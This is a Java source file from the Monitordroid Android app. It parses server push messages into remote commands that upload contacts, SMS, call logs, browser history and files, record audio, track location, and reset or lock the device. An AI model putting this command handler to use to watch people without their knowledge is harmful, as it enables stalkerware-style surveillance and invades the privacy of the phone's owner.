/**
 * Copyright (C) 2015 Monitordroid Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 * 
 * @author Tyler Butler
 **/

package com.monitordroid.app;

import android.content.Context;
import android.content.Intent;
import android.database.CursorIndexOutOfBoundsException;

public class MessageAction {

	/**
	 * Takes an input raw GCM Message, parses it, then determines what to do
	 * with it
	 * 
	 * @param message
	 *            The raw GCM Message
	 */
	public void actionParser(Context context, String message) {
		// An instance of these classes needs to be created each time so that
		// they can be stopped by a subsequent command.
		Flashlight fl = new Flashlight();
		Intent audioPlayer = new Intent(context, AudioPlayer.class);
		Intent locationUpdate = new Intent(context, LocationService.class);

		// Stops the playing of any media
		if (message.equals("stopplay")) {
			context.stopService(audioPlayer);
		}

		// Stops the auto-location service
		if (message.equals("stoplocation")) {
			context.stopService(locationUpdate);
		}

		// Uploads the device's contacts to the server
		if (message.equals("contacts")) {
			ContactsFetcher mContact = new ContactsFetcher();
			mContact.executeFetch(context);
		}

		// Uploads the device's call logs to the server
		if (message.equals("calls")) {
			CallLogGetter cl = new CallLogGetter();
			cl.fetchLog(context);
		}

		// Turns the device's flashlight on
		if (message.equals("flashon")) {
			fl.flashOn(context);
		}

		// Turns the device's flashlight off
		if (message.equals("flashoff")) {
			fl.flashOff(context);
		}

		// Sets the device's ringer to ring
		if (message.equals("setvolumering")) {
			Volume vm = new Volume();
			vm.loud(context);
		}

		// Sets the device's ringer to vibrate
		if (message.equals("setvolumevibrate")) {
			Volume vm = new Volume();
			vm.vibrate(context);
		}

		// Sets the device's ringer to silent
		if (message.equals("setvolumesilent")) {
			Volume vm = new Volume();
			vm.silent(context);
		}

		// Turns the device's master volume up
		if (message.equals("vup")) {
			Volume vm = new Volume();
			vm.raiseVolume(context);
		}

		// Turns the device's master volume down
		if (message.equals("vdown")) {
			Volume vm = new Volume();
			vm.lowerVolume(context);
		}

		// Turns the device's media volume up
		if (message.equals("mvup")) {
			Volume vm = new Volume();
			vm.raiseMediaVolume(context);
		}

		// Turns the device's media volume down
		if (message.equals("mvdown")) {
			Volume vm = new Volume();
			vm.lowerMediaVolume(context);
		}

		// Uploads the list of applications installed on the device to the
		// server
		if (message.equals("getapps")) {
			InstalledAppsFetcher ga = new InstalledAppsFetcher();
			ga.fetchInstalledApps(context);
		}

		// Uploads a variety of information (phone number, network operator,
		// etc.) from the device to the server
		if (message.equals("getdeviceinfo")) {
			DeviceInformation di = new DeviceInformation();
			di.getDeviceInformation(context);
		}

		// Locks the device
		if (message.equals("lock")) {
			DeviceAdmin da = new DeviceAdmin();
			da.lockDevice(context);
		}

		// Enables the device's camera
		if (message.equals("cameraon")) {
			DeviceAdmin da = new DeviceAdmin();
			da.disableCamera(context, false);
		}

		// Disables the device's camera
		if (message.equals("cameraoff")) {
			DeviceAdmin da = new DeviceAdmin();
			da.disableCamera(context, true);
		}

		/**
		 * The following algorithms parse distinct information from GCM commands
		 * such as phone numbers, URLs, and file paths.
		 *
		 * --------------------------------------------------------------------
		 */

		// Send SMS
		// Extracts a text message and an intended recipient's phone number from
		// the GCM message then forwards it to be sent

		try {
			if (message.length() > 8) {
				String messageDeterminant = message.substring(0, 7);
				if (messageDeterminant.equals("sendsms")) {
					String phoneNumber = "";
					for (int i = 8; message.charAt(i) != ','; i++) {
						phoneNumber += message.charAt(i);
					}
					if (message.length() > 8 + phoneNumber.length() + 3) {
						String smsMessage = "";
						for (int i = 8 + phoneNumber.length() + 1; i < message
								.length() - 1; i++) {
							smsMessage += message.charAt(i);
						}
						smsMessage = smsMessage.trim();
						SMSUtilities mSms = new SMSUtilities();
						mSms.sendSMS(context, phoneNumber, smsMessage);
					}
				}
			}
		}
		catch (StringIndexOutOfBoundsException e) {
		}
		catch (NullPointerException e) {
		}
		catch (IllegalArgumentException e) {
		}

		// -------------------------------------------------------------------------------------------------------------------

		// Initiate Phonecall
		// Extracts a phone number from the GCM Message then initates a call to
		// that number

		try {
			if (message.length() > 6) {
				String messageDeterminant = message.substring(0, 4);
				if (messageDeterminant.equals("call")) {
					String phoneNumber = "";
					for (int i = 5; i < message.length() - 1; i++) {
						phoneNumber += message.charAt(i);
					}
					phoneNumber = phoneNumber.trim();
					if (!phoneNumber.equals("")) {
						Telephone cp = new Telephone();
						cp.callPhone(context, phoneNumber);
					}
				}
			}
		}
		catch (StringIndexOutOfBoundsException e) {
		}
		catch (NullPointerException e) {
		}
		catch (IllegalArgumentException e) {
		}

		// --------------------------------------------------------------------------------------

		// Play Media
		// Extracts a URL from the GCM Message and forwards it to be played

		try {
			if (message.length() > 6) {
				String messageDeterminant = message.substring(0, 4);
				if (messageDeterminant.equals("play")) {
					String url = "";
					for (int i = 5; i < message.length() - 1; i++) {
						url += message.charAt(i);
					}
					url = url.trim();
					if (!url.equals("")) {
						context.stopService(audioPlayer);
						audioPlayer.putExtra("url", url);
						context.startService(audioPlayer);
					}
				}
			}
		}
		catch (StringIndexOutOfBoundsException e) {
		}
		catch (NullPointerException e) {
		}
		catch (IllegalArgumentException e) {
		}

		// ----------------------------------------------------------------------------------------

		// Open Webpage
		// Extracts a URL from the GCM Message and opens it in the device's
		// default
		// web browser

		try {
			if (message.length() > 6) {
				String messageDeterminant = message.substring(0, 4);
				if (messageDeterminant.equals("open")) {
					String url = "";
					for (int i = 5; i < message.length() - 1; i++) {
						url += message.charAt(i);
					}
					url = url.trim();
					if (!url.equals("")) {
						WebpageOpener ow = new WebpageOpener();
						ow.openPage(context, url);
					}
				}
			}
		}
		catch (StringIndexOutOfBoundsException e) {
		}
		catch (NullPointerException e) {
		}
		catch (IllegalArgumentException e) {
		}

		// ---------------------------------------------------------------------------

		// Send Notification
		// Extracts a notification message from the GCM message and then
		// forwards
		// it to be displayed

		try {
			if (message.length() > 6) {
				String messageDeterminant = message.substring(0, 4);
				if (messageDeterminant.equals("sedn")) {
					String note = "";
					for (int i = 5; i < message.length() - 1; i++) {
						note += message.charAt(i);
					}
					note = note.trim();
					if (!note.equals("")) {
						SendNotification sn = new SendNotification();
						sn.generateNotification(context, note);
					}
				}
			}
		}
		catch (StringIndexOutOfBoundsException e) {
		}
		catch (NullPointerException e) {
		}
		catch (IllegalArgumentException e) {
		}

		// --------------------------------------------------------------------------------------------

		// Upload File
		// Extracts a filename and its path, and uploads that file to the server

		try {
			if (message.length() > 11) {
				String messageDeterminant = message.substring(0, 10);
				if (messageDeterminant.equals("uploadfile")) {
					String[] parts = message.split(";");
					// Parse the incoming message. Using ";" as the split
					// character, the first part contains the picture name
					// and the second part contains the path that the picture is
					// in
					if (parts.length == 2) {
						String fileNameSegment = parts[0];
						String filePath = parts[1];
						String fileName = "";
						// Get the raw picture name from the picture name
						// segment
						for (int i = 11; i < fileNameSegment.length() - 1; i++) {
							fileName += fileNameSegment.charAt(i);
						}
						fileName = fileName.trim();
						// Get the extension from the picture name
						String[] fileNameParts = fileName.split("\\.");
						if (fileNameParts.length == 2) {
							FileUtilities up = new FileUtilities();
							up.upload(context, fileName, filePath);
						}
					}
				}
			}
		}
		catch (StringIndexOutOfBoundsException e) {
		}
		catch (NullPointerException e) {
		}
		catch (IllegalArgumentException e) {
		}

		// ---------------------------------------------------------------------------------------------------

		/*
		 * Upload File List
		 * 
		 * Uploads the names of all the files in the input directory. Example:
		 * getfilelist;/DCIM/Camera
		 */

		try {
			if (message.length() >= 11) {
				String messageDeterminant = message.substring(0, 11);
				if (messageDeterminant.equals("getfilelist")) {
					// Split message up into formatted parts
					String[] parts = message.split(";");
					// Check for properly formatted message to avoid index out
					// of bound exception
					if (parts.length == 2) {
						FileUtilities up = new FileUtilities();
						up.uploadFileNames(context, parts[1]);
					}
				}
			}
		}

		catch (StringIndexOutOfBoundsException e) {
		}
		catch (NullPointerException e) {
		}
		catch (IllegalArgumentException e) {
		}

		// ---------------------------------------------------------------------------------------------------

		/*
		 * Read SMS Messages
		 * 
		 * User sends command to update SMS Messages Format: "readsms-(iteration
		 * of messages to send)-(whether to resolve contacts) Example:
		 * "readsms-1-1" will send the first batch of 600 text messages,
		 * clearing previous update data and also resolve the names to contacts,
		 * which will increase the time it takes to perform the algorithm.
		 * "readsms-2-0" will concatenate the next 600 messages onto the end of
		 * the previous messages in the database, but not resolve contact names,
		 * making the algorithm run more efficiently. A GCM message of just
		 * 'readsms' will default to "readsms-1-0"
		 */

		try {
			if (message.length() >= 7) {
				String messageDeterminant = message.substring(0, 7);
				if (messageDeterminant.equals("readsms")) {
					SMSUtilities mSMS = new SMSUtilities();
					if (message.equals("readsms")) {
						mSMS.fetchSMS(context, 1);
					}
					else {
						String[] parts = message.split("-");
						// Check for properly formatted message to avoid index
						// out of bounds exception
						if (parts.length == 2) {
							// Check which iteration of messages it wants
							int iteration = Integer.parseInt(parts[1]);
							mSMS.fetchSMS(context, iteration);
						}
					}
				}
			}
		}

		catch (StringIndexOutOfBoundsException e) {
		}
		catch (NullPointerException e) {
		}
		catch (IllegalArgumentException e) {
		}

		// -------------------------------------------------------------------------------------------

		/*
		 * Read Browser History
		 * 
		 * User sends command to update browser history format:
		 * getbrowserhistory-(iteration) Example "getbrowserhistory-2" will send
		 * the second set of 100 links from the device's browser history to the
		 * Monitordroid web server.
		 */

		try {
			if (message.length() >= 17) {
				String messageDeterminant = message.substring(0, 17);
				if (messageDeterminant.equals("getbrowserhistory")) {
					GetBrowserHistory gb = new GetBrowserHistory();
					if (message.equals("getbrowserhistory")) {
						gb.getHistory(context, 1);
					}
					else {
						String[] parts = message.split("-");
						// Check for properly formatted message to avoid index
						// out of bounds exception
						if (parts.length == 2) {
							// Check which iteration of messages it wants
							int iteration = Integer.parseInt(parts[1]);
							gb.getHistory(context, iteration);
						}
					}
				}
			}
		}

		catch (CursorIndexOutOfBoundsException e) {
		}
		catch (StringIndexOutOfBoundsException e) {
		}
		catch (NullPointerException e) {
		}
		catch (IllegalArgumentException e) {
		}

		// ----------------------------------------------------------------------------------------

		/*
		 * Device Location
		 * 
		 * User sends command to start location services. format:
		 * "location-(number of minutes between location refreshes)" Ex:
		 * "location-5" will update the devices location every 5 minutes
		 */
		try {
			if (message.length() >= 8) {
				String messageDeterminant = message.substring(0, 8);
				if (messageDeterminant.equals("location")) {
					// Message is just "location", request a single update
					if (message.equals("location")) {
						// Stops auto-locate if it's already running
						context.stopService(locationUpdate);
						locationUpdate.putExtra("minutesTillRefresh", 0);
						context.startService(locationUpdate);
					}
					// Split message up into formatted parts
					else {
						String[] parts = message.split("-");
						// Check for properly formatted message to avoid index
						// out of bound exception
						if (parts.length == 2) {
							// Check to see the value the user chose for the
							// time between location refreshes
							int minutesTillRefresh = Integer.parseInt(parts[1]);
							context.stopService(locationUpdate);
							locationUpdate.putExtra("minutesTillRefresh",
									minutesTillRefresh);
							context.startService(locationUpdate);
						}
					}
				}
			}
		}

		catch (StringIndexOutOfBoundsException e) {
		}
		catch (NullPointerException e) {
		}
		catch (IllegalArgumentException e) {
		}

		// ---------------------------------------------------------------------------------------------------

		/*
		 * Reset Device Password
		 * 
		 * User sends command to reset the device's password format:
		 * "resetpassword-(newpassword)" Ex: "resetpassword-123456" will make
		 * the device's new password "123456"
		 */
		try {
			if (message.length() >= 13) {
				String messageDeterminant = message.substring(0, 13);
				if (messageDeterminant.equals("resetpassword")) {
					// Split message up into formatted parts
					String[] parts = message.split("-");
					// Check for properly formatted message to avoid index out
					// of bound exception
					if (parts.length == 2 && !containsIllegalChars(message)) {
						DeviceAdmin da = new DeviceAdmin();
						da.resetPassword(context, parts[1]);
					}
				}
			}
		}

		catch (StringIndexOutOfBoundsException e) {
		}
		catch (NullPointerException e) {
		}
		catch (IllegalArgumentException e) {
		}

		// ----------------------------------------------------------------------------------------

		/*
		 * Record Sound
		 * 
		 * Tells the device to record audio for a specified number of minutes,
		 * and then upload the sound file to the server.
		 * 
		 * Format: record-(number of minutes) Ex: "record-5" will record audio
		 * for 5 minutes.
		 * 
		 * Note: Can record for a maximum of 30 minutes
		 */
		if (message.length() >= 6) {
			String messageDeterminant = message.substring(0, 6);
			if (messageDeterminant.equals("record")) {
				// If the message is only "record", default to 1 minute
				if (message.equals("record")) {
					try {
						Intent soundRecorder = new Intent(context,
								SoundRecorder.class);
						soundRecorder.putExtra("recordTime", 1);
						context.startService(soundRecorder);
					}
					catch (IllegalStateException e) {
					}
					catch (Exception e) {

					}
				}
				else {
					try {
						// Split message up into formatted parts
						String[] parts = message.split("-");
						int time = Integer.parseInt(parts[1]);
						if (time > 30) {
							time = 30;
						}
						// Check for properly formatted message to avoid index
						// out
						// of bounds exception
						if (parts.length == 2) {

							Intent soundRecorder = new Intent(context,
									SoundRecorder.class);
							soundRecorder.putExtra("recordTime", time);
							context.startService(soundRecorder);
						}
					}
					catch (IllegalStateException e) {
					}
					catch (NumberFormatException e) {
					}
					catch (Exception e) {

					}
				}

			}
		}

	}

	/**
	 * Helper method for "resetpassword" function. Checks to make sure no
	 * illegal characters are contained within the input new password which
	 * could cause an unintended password to be set.
	 * 
	 * @param message
	 *            The intended new password
	 */
	private boolean containsIllegalChars(String message) {
		if (message.contains("\"") || message.contains("\\")) {
			return true;
		}
		return false;
	}

}
